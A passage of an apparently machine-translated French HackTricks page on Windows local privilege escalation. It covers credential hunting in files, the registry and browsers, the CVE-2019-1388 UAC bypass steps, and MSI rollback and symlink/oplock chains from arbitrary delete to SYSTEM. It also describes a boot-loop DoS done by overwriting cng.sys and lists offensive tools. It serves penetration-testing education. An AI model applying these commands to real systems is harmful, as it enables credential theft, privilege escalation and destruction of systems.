reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historique des navigateurs

Vous devriez vérifier les dbs où sont stockés les mots de passe de **Chrome ou Firefox**.\
Vérifiez également l'historique, les marque-pages et les favoris des navigateurs, car certains **mots de passe** peuvent y être stockés.

Outils pour extraire les mots de passe des navigateurs :

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** est une technologie intégrée au système d'exploitation Windows qui permet la **communication** entre composants logiciels écrits dans différents langages. Chaque composant COM est **identifié via un class ID (CLSID)** et chaque composant expose des fonctionnalités via une ou plusieurs interfaces, identifiées via des interface IDs (IIDs).

Les classes et interfaces COM sont définies dans le registre sous **HKEY\CLASSES\ROOT\CLSID** et **HKEY\CLASSES\ROOT\Interface** respectivement. Ce registre est créé en fusionnant **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

À l'intérieur des CLSIDs de ce registre, vous pouvez trouver la clé enfant **InProcServer32** qui contient une **valeur par défaut** pointant vers une **DLL** et une valeur appelée **ThreadingModel** qui peut être **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ou **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

En pratique, si vous pouvez **overwrite any of the DLLs** qui vont être exécutées, vous pourriez **escalate privileges** si cette DLL est exécutée par un autre utilisateur.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Recherche générique de mots de passe dans les fichiers et le registre**

**Rechercher le contenu des fichiers**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Rechercher un fichier portant un certain nom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Rechercher dans le registre les noms de clés et les mots de passe**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Outils qui recherchent des passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **est un plugin msf** que j'ai créé pour **exécuter automatiquement tous les modules POST de metasploit qui recherchent des credentials** sur la victime.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) recherche automatiquement tous les fichiers contenant des passwords mentionnés dans cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) est un autre excellent outil pour extraire des passwords d'un système.

L'outil [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) recherche les **sessions**, **usernames** et **passwords** de plusieurs outils qui sauvegardent ces données en clair (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imaginez qu'**un processus s'exécutant en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) avec **full access**. Le même processus **crée également un nouveau processus** (`CreateProcess()`) **avec low privileges mais héritant de tous les handles ouverts du processus principal**.\
Ensuite, si vous avez **full access au processus à low privileges**, vous pouvez récupérer le **handle ouvert vers le privileged process créé** avec `OpenProcess()` et **injecter un shellcode**.\
[Lisez cet exemple pour plus d'informations sur **comment détecter et exploiter cette vulnérabilité**.](leaked-handle-exploitation.md)\
[Lisez cet **autre article pour une explication plus complète sur la façon de tester et d'abuser d'autres open handlers de processus et de threads hérités avec différents niveaux de permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre processus et le transfert de données.

Windows propose une fonctionnalité appelée **Named Pipes**, permettant à des processus non liés de partager des données, y compris sur des réseaux différents. Cela ressemble à une architecture client/server, avec des rôles définis comme **named pipe server** et **named pipe client**.

Quand des données sont envoyées via une pipe par un **client**, le **server** qui a créé la pipe peut **prendre l'identité** du **client**, à condition d'avoir les droits **SeImpersonate** nécessaires. Identifier un **privileged process** qui communique via une pipe que vous pouvez imiter offre la possibilité de **gain higher privileges** en adoptant l'identité de ce processus lorsqu'il interagit avec la pipe que vous avez établie. Pour des instructions sur l'exécution d'une telle attaque, des guides utiles se trouvent [**ici**](named-pipe-client-impersonation.md) et [**ici**](#from-high-integrity-to-system).

De plus, l'outil suivant permet de **intercepter une communication de named pipe avec un outil comme burp :** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de lister et voir toutes les pipes pour trouver privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Le service Telephony (TapiSrv) en mode server expose `\\pipe\\tapsrv` (MS-TRP). Un client distant authentifié peut abuser du chemin d'événements asynchrones basé sur mailslot pour transformer `ClientAttach` en une **4-byte write** arbitraire vers n'importe quel fichier existant writable par `NETWORK SERVICE`, puis obtenir les droits d'administrateur Telephony et charger une DLL arbitraire en tant que service. Flux complet :

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Divers

### File Extensions that could execute stuff in Windows

Consultez la page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Les liens Markdown cliquables redirigés vers `ShellExecuteExW` peuvent déclencher des handlers URI dangereux (`file:`, `ms-appinstaller:` ou tout schéma enregistré) et exécuter des fichiers contrôlés par l'attaquant en tant qu'utilisateur courant. Voir :

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Surveiller les lignes de commande pour les mots de passe**

Lorsque vous obtenez un shell en tant qu'utilisateur, il peut y avoir des tâches planifiées ou d'autres processus exécutés qui passent des identifiants en ligne de commande. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et compare l'état actuel avec l'état précédent, affichant les différences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Voler des mots de passe depuis des processus

## De Low Priv User à NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si vous avez accès à l'interface graphique (via console ou RDP) et que UAC est activé, dans certaines versions de Microsoft Windows il est possible d'exécuter un terminal ou tout autre processus tel que "NT\AUTHORITY SYSTEM" depuis un utilisateur non privilégié.

Cela permet d'escalader les privilèges et de contourner UAC en même temps via la même vulnérabilité. De plus, il n'est pas nécessaire d'installer quoi que ce soit et le binaire utilisé pendant le processus est signé et émis par Microsoft.

Certains des systèmes affectés sont les suivants:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Pour exploiter cette vulnérabilité, il est nécessaire d'effectuer les étapes suivantes :
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## De Administrator Medium à High Integrity Level / contournement UAC

Lisez ceci pour en savoir plus sur les niveaux d'intégrité :


{{#ref}}
integrity-levels.md
{{#endref}}

Puis lisez ceci pour en savoir plus sur l'UAC et les contournements de l'UAC :


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## De la suppression/déplacement/renommage arbitraire d'un dossier à SYSTEM EoP

La technique décrite [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) avec un exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attaque consiste essentiellement à abuser de la feature de rollback du Windows Installer pour remplacer des fichiers légitimes par des fichiers malveillants pendant le processus de désinstallation. Pour cela l'attaquant doit créer un **MSI malveillant** qui sera utilisé pour détourner le dossier `C:\Config.Msi`, lequel sera ensuite utilisé par le Windows Installer pour stocker des rollback files pendant la désinstallation d'autres packages MSI où ces rollback files auront été modifiés pour contenir le payload malveillant.

La technique résumée est la suivante :

1. **Stage 1 – Préparation du détournement (laisser `C:\Config.Msi` vide)**

- Step 1: Install the MSI
- Créez un `.msi` qui installe un fichier inoffensif (par ex., `dummy.txt`) dans un dossier inscriptible (`TARGETDIR`).
- Marquez l'installer comme **"UAC Compliant"**, afin qu'un **utilisateur non-admin** puisse l'exécuter.
- Gardez un **handle** ouvert sur le fichier après l'installation.

- Step 2: Begin Uninstall
- Désinstallez le même `.msi`.
- Le processus de désinstallation commence à déplacer des fichiers vers `C:\Config.Msi` et à les renommer en fichiers `.rbf` (rollback backups).
- **Interrogez le handle de fichier ouvert** en utilisant `GetFinalPathNameByHandle` pour détecter quand le fichier devient `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Le `.msi` inclut une **action de désinstallation personnalisée (`SyncOnRbfWritten`)** qui :
- Signale quand le `.rbf` a été écrit.
- Puis **attend** sur un autre événement avant de continuer la désinstallation.

- Step 4: Block Deletion of `.rbf`
- Lorsqu'il est signalé, **ouvrez le fichier `.rbf`** sans `FILE_SHARE_DELETE` — cela **empêche sa suppression**.
- Puis **signalez en retour** pour que la désinstallation puisse se terminer.
- Windows Installer échoue à supprimer le `.rbf`, et comme il ne peut pas supprimer tout le contenu, **`C:\Config.Msi` n'est pas supprimé**.

- Step 5: Manually Delete `.rbf`
- Vous (l'attaquant) supprimez manuellement le fichier `.rbf`.
- Maintenant **`C:\Config.Msi` est vide**, prêt à être détourné.

> À ce stade, **déclenchez la vulnérabilité de suppression arbitraire de dossier au niveau SYSTEM** pour supprimer `C:\Config.Msi`.

2. **Stage 2 – Remplacement des rollback scripts par des scripts malveillants**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recréez vous-même le dossier `C:\Config.Msi`.
- Définissez des **DACLs faibles** (par ex., Everyone:F), et **gardez un handle ouvert** avec `WRITE_DAC`.

- Step 7: Run Another Install
- Installez le `.msi` à nouveau, avec :
- `TARGETDIR` : emplacement inscriptible.
- `ERROROUT` : une variable qui déclenche une erreur forcée.
- Cette installation sera utilisée pour déclencher à nouveau un **rollback**, qui lira les `.rbs` et `.rbf`.

- Step 8: Monitor for `.rbs`
- Utilisez `ReadDirectoryChangesW` pour surveiller `C:\Config.Msi` jusqu'à ce qu'un nouveau `.rbs` apparaisse.
- Capturez son nom de fichier.

- Step 9: Sync Before Rollback
- Le `.msi` contient une **action d'installation personnalisée (`SyncBeforeRollback`)** qui :
- Signale un événement quand le `.rbs` est créé.
- Puis **attend** avant de continuer.

- Step 10: Reapply Weak ACL
- Après réception de l'événement `*.rbs créé` :
- Le Windows Installer **réapplique des ACLs fortes** sur `C:\Config.Msi`.
- Mais comme vous avez toujours un handle avec `WRITE_DAC`, vous pouvez **réappliquer des ACLs faibles** à nouveau.

> Les ACLs ne sont **appliquées qu'à l'ouverture du handle**, donc vous pouvez toujours écrire dans le dossier.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Écrasez le fichier `.rbs` avec un **faux rollback script** qui ordonne à Windows de :
- Restaurer votre fichier `.rbf` (DLL malveillante) dans un **emplacement privilégié** (par ex., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Déposer votre faux `.rbf` contenant une **DLL payload au niveau SYSTEM**.

- Step 12: Trigger the Rollback
- Signalez l'événement de synchronisation pour que l'installateur reprenne.
- Une **action custom de type 19 (`ErrorOut`)** est configurée pour **faire échouer intentionnellement l'installation** à un point connu.
- Cela provoque le **début du rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer :
- Lit votre `.rbs` malveillant.
- Copie votre DLL `.rbf` dans l'emplacement cible.
- Vous avez maintenant votre **DLL malveillante dans un chemin chargé par SYSTEM**.

- Final Step: Execute SYSTEM Code
- Exécutez un binaire de confiance **auto-elevated** (par ex., `osk.exe`) qui charge la DLL que vous avez détournée.
- **Boom** : Votre code est exécuté **en tant que SYSTEM**.


### De la suppression/déplacement/renommage arbitraire de fichiers à SYSTEM EoP

La principale technique de rollback MSI (la précédente) suppose que vous pouvez supprimer un **dossier entier** (par ex., `C:\Config.Msi`). Mais que se passe-t-il si votre vulnérabilité ne permet que la **suppression arbitraire de fichiers** ?

Vous pouvez exploiter les internals de NTFS : chaque dossier a un flux de données alternatif caché appelé :
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ce flux stocke les **métadonnées d'index** du dossier.

Ainsi, si vous **supprimez le flux `::$INDEX_ALLOCATION`** d'un dossier, NTFS **supprime le dossier entier** du système de fichiers.

Vous pouvez faire cela en utilisant des API standard de suppression de fichiers telles que :
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Même si vous appelez une API de suppression de *fichier*, elle **supprime le dossier lui-même**.

### De Folder Contents Delete à SYSTEM EoP
Et si votre primitive ne vous permet pas de supprimer des fichiers/dossiers arbitraires, mais qu'elle **autorise la suppression du *contenu* d'un dossier contrôlé par l'attaquant** ?

1. Étape 1 : Préparez un dossier leurre et un fichier
- Créez : `C:\temp\folder1`
- À l'intérieur : `C:\temp\folder1\file1.txt`

2. Étape 2 : Placez un **oplock** sur `file1.txt`
- L'oplock **met en pause l'exécution** lorsqu'un processus privilégié tente de supprimer `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Étape 3 : Déclencher le processus SYSTEM (e.g., `SilentCleanup`)
- Ce processus parcourt les dossiers (e.g., `%TEMP%`) et essaie de supprimer leur contenu.
- Lorsqu'il atteint `file1.txt`, le **oplock se déclenche** et transfère le contrôle à votre callback.

4. Étape 4 : Dans le callback d'oplock – rediriger la suppression

- Option A : Déplacer `file1.txt` ailleurs
- Cela vide `folder1` sans casser l'oplock.
- Ne supprimez pas `file1.txt` directement — cela libérerait l'oplock prématurément.

- Option B : Convertir `folder1` en une **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Créer un **symlink** dans `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ceci cible le flux interne NTFS qui stocke les métadonnées du dossier — le supprimer supprime le dossier.

5. Étape 5 : Release the oplock
- Le processus SYSTEM continue et essaie de supprimer `file1.txt`.
- Mais maintenant, à cause de la junction + symlink, il supprime en fait :
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` est supprimé par SYSTEM.

### De Arbitrary Folder Create à DoS permanent

Exploitez une primitive qui vous permet de **créer un dossier arbitraire en tant que SYSTEM/admin** — même si **vous ne pouvez pas écrire de fichiers** ou **définir des permissions faibles**.

Créez un **dossier** (pas un fichier) portant le nom d'un **pilote Windows critique**, p. ex. :
```
C:\Windows\System32\cng.sys
```
- Ce chemin correspond normalement au pilote kernel-mode `cng.sys`.
- Si vous le **pré-créez en tant que dossier**, Windows ne parvient pas à charger le pilote réel au démarrage.
- Ensuite, Windows tente de charger `cng.sys` pendant le démarrage.
- Il voit le dossier, **ne parvient pas à résoudre le pilote réel**, et **provoque un plantage ou interrompt le démarrage**.
- Il n'existe **aucun mécanisme de secours**, et **aucune récupération** sans intervention externe (p.ex., réparation du démarrage ou accès au disque).

### Des chemins de logs/sauvegardes privilégiés + OM symlinks vers écriture arbitraire de fichier / DoS au démarrage

Quand un **service privilégié** écrit des logs/exports vers un chemin lu depuis une **configuration modifiable**, redirigez ce chemin avec **Object Manager symlinks + NTFS mount points** pour transformer l'écriture privilégiée en une écriture arbitraire (même **sans** SeCreateSymbolicLinkPrivilege).

**Exigences**
- Le fichier de configuration qui stocke le chemin cible est inscriptible par l'attaquant (p.ex., `%ProgramData%\...\.ini`).
- Capacité à créer un point de montage vers `\RPC Control` et un OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Une opération privilégiée qui écrit vers ce chemin (log, export, report).

**Chaîne d'exemple**
1. Lire la config pour récupérer la destination du log privilégié, p.ex. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` dans `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Rediriger le chemin sans admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendez que le composant privilégié écrive le log (par ex., l'admin déclenche "send test SMS"). L'écriture aboutit maintenant dans `C:\Windows\System32\cng.sys`.  
4. Inspectez la cible écrasée (hex/PE parser) pour confirmer la corruption ; un redémarrage force Windows à charger le chemin du driver altéré → **boot loop DoS**. Cela se généralise aussi à tout fichier protégé qu'un service privilégié ouvrira en écriture.

> `cng.sys` est normalement chargé depuis `C:\Windows\System32\drivers\cng.sys`, mais si une copie existe dans `C:\Windows\System32\cng.sys` elle peut être tentée en premier, ce qui en fait un puits DoS fiable pour des données corrompues.



## **De l'intégrité élevée à SYSTEM**

### **Nouveau service**

Si vous exécutez déjà un processus en intégrité élevée, le **chemin vers SYSTEM** peut être simple : il suffit de **créer et exécuter un nouveau service** :
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Lors de la création d'un service binaire, assurez-vous que c'est un service valide ou que le binaire effectue les actions nécessaires assez rapidement, car il sera tué au bout de 20s s'il n'est pas un service valide.

### AlwaysInstallElevated

Depuis un process High Integrity vous pouvez essayer d'**activer les entrées de registre AlwaysInstallElevated** et **installer** un reverse shell en utilisant un wrapper _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Vous pouvez** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si vous disposez de ces privilèges de token (probablement trouvés dans un process déjà High Integrity), vous pourrez **ouvrir presque n'importe quel process** (pas les processus protégés) avec le privilège SeDebug, **copier le token** du process, et créer un **processus arbitraire avec ce token**.\
En utilisant cette technique on sélectionne généralement un processus s'exécutant en tant que SYSTEM avec tous les privilèges de token (_oui, vous pouvez trouver des processus SYSTEM sans tous les privilèges de token_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour escalader dans `getsystem`. La technique consiste à **créer un pipe puis créer/abuser d'un service pour écrire dans ce pipe**. Ensuite, le **server** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **impersonate le token** du client du pipe (le service) obtenant des privilèges SYSTEM.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si vous parvenez à **hijack une dll** chargée par un **process** exécuté en tant que **SYSTEM**, vous serez capable d'exécuter du code arbitraire avec ces permissions. Par conséquent Dll Hijacking est aussi utile pour ce type d'escalade de privilèges, et, de plus, il est bien **plus facile à réaliser depuis un process high integrity** car il aura les **permissions d'écriture** sur les dossiers utilisés pour charger les dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Vérifie les mauvaises configurations et les fichiers sensibles (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Vérifie certaines potentielles mauvaises configurations et collecte des infos (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Vérifie les mauvaises configurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrait les sessions sauvegardées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utiliser -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les crendentials depuis Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray des mots de passe collectés sur le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un spoofeur ADIDNS/LLMNR/mDNS et un outil man-in-the-middle en PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération Windows basique pour privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Recherche des vulnérabilités de privesc connues (DEPRÉCIÉ pour Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Checks locaux **(Nécessite les droits Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche des vulnérabilités de privesc connues (doit être compilé avec VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère la machine à la recherche de mauvaises configurations (plus un outil de collecte d'infos que de privesc) (doit être compilé) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait des credentials depuis de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp en C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Vérifie les mauvaises configurations (exécutable précompilé sur github). Pas recommandé. Ne fonctionne pas bien sur Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Vérifie les potentielles mauvaises configurations (exe à partir de python). Pas recommandé. Ne fonctionne pas bien sur Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé basé sur ce post (ne nécessite pas accesschk pour fonctionner correctement mais peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Vous devez compiler le projet en utilisant la bonne version de .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour voir la version de .NET installée sur la machine victime vous pouvez faire :
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Références

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) et kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Poursuite du Silver Fox : Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnérabilité du privileged file system présente dans un système SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – utilisation de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
